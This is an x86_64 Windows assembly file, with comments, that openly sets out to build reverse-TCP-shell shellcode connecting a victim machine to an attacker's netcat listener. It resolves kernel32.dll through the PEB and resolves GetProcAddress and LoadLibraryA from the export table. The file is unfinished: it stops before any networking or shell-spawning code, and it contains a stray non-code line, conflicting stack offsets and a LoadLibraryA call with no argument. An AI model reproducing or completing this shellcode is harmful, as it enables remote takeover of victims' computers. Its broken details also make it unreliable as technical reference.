; Here first of all we are going to write a x86_64 architecture assembly code for Windows
; This code is about getting a reverse_tcp_shell on attackers machine
; This code will create a client on victim machine that can talk to server on attackers mahine.
; we will start a listner on kali(attacker mahine). We will create listner with the help of netcat.exe
; command for netcat will be "nc.exe -nvlp [PORT]". Just mention the port number where you want to listen to client.

;Windows API that we need specific for this code:
; 1. WSAstartup
; 2. WSASocketA
; 3. WSAConnect
; 4. CreateProcessA
; 5. WaitForSingleObject
; 6. CloseHandle


seperate out 7th point

; How to flow of shellcode should be
; Step1: From FS and GS register find out the address of PEB


global main

section .text

main:
    int3 
    push rbp
    mov rbp, rsp
    sub rsp, 80
    mov rax, [gs:0x60]   ; get address of PEB by adding 60h in TEB. get TEB from GS register. Windbg -> dt nt!_teb <address>
                         ; dt nt!_PEB <address>
    mov rax, [rax+0x18]  ; get address of LDR within PEB by adding 18h in PEB. 
    mov rax, [rax+0x20]  ; get address of InMemoryOrderModuleList within LDR by adding 20h into address of LDR. InMemoryOrderModuleList is a doubly linked list.
                         ; in the destination rax register we have address of EXE itself 
    mov rax, [rax]  ; Second thing in InMemoryOrderModuleList is ntdll.dll itself
    mov rax, [rax]  ; Third thing kin InMemoryOrderModuleList is kernel32.dll
                    ; Windbg -> dt _LDR_DATA_TABLE_ENTRY <address>. Here address is stored in rax
    mov rax, [rax+20h] ; Here we got the base address of kernel32.dll
    mov [rbp-8h], rax ; saving address in stack. KERNEL32.DLL BASE ADDRESS IN RBP-8(STACK)
    xor rbx, rbx
    mov bx, [rax+0x3c] ; Here we got offset of NT header
    add rax, rbx  ; adding offset in baseaddress of kernel32.dll
    mov eax, [rax+88h]  ; Here we got the RVA of explort table
    add rax, [rbp-8h]  ; VA of export table 

    mov ebx, [rax+1ch]  ; address of function
    mov [rbp-16h], ebx  ; SAVING "ADDRESS OF FUNCTION" IN STACK
    mov ebx, [rax+20h]  ; address of name
    mov [rbp-24h], ebx  ; SAVING VIRTUAL ADDRESS of "ADDRESS OF NAME" IN STACK
    mov ebx, [rax+24h]  ; address of nameordinals   
    mov [rbp-32h], ebx  ;SAVING relative virtual address "ADDRESS OF NAMEORDINAL" IN STACK
    mov rsi, 41636f7250746547h  ; GetprocA 
    
    xor r9, r9  ; setting up the counter
    mov ebx, [rbp-24h]  ; moving relative virtual address of address of name in ebx
    add rbx, [rbp-8h]   ; adding base address of dll with. From here onwards we can find the address of name

    loop:
    inc r9
    mov ecx, [rbx + r9*4h]
    add rcx, [rbp-8h]
    cmp [rcx], rsi  ; write function name in rsi  
    jnz loop

    mov ebx, [rbp-32h]
    add rbx, [rbp-8h]
    xor rcx, rcx
    mov cx, [rbx + r9*2] ; each entry in ordinal table is of 2 bytes
    
    mov ebx, [rbp-16h] ; ebx have rva
    add rbx, [rbp-8h] ;
    mov ecx, [rbx + rcx*4] ; each entry in "address of function" table  is of 4 bytes
    add rcx, [rbp-8]  ; Here we got the address of GetProcAddress
    mov [rbp-16], rcx  ; saving address of getProcAddress in stack

    ;First para(rcx) ->> Kernel32.dll  -->>  6c6c642e 32336c656e72656b
    ;second para(rdx) ->> LoadLibraryA  -->> 41797261 7262694c64616f4c

    
    mov rcx, [rbp-8]
    mov eax, 41797261h
    push rax
    mov rax, 7262694c64616f4ch
    push rax
    mov rdx, rsp
    sub rsp, 30h
    call [rbp-16]  ; calling GetProcAddress
    add rsp, 40h
    mov [rbp-24], rax  ; saving the address of LoadLibraryA

    ;Fist para (rcx) -> Ws2_32.dll  -->>  6c 6c64 2e32335f327357

    call [rbp-24] ; calling LoadLibraryA
    nop
    ret
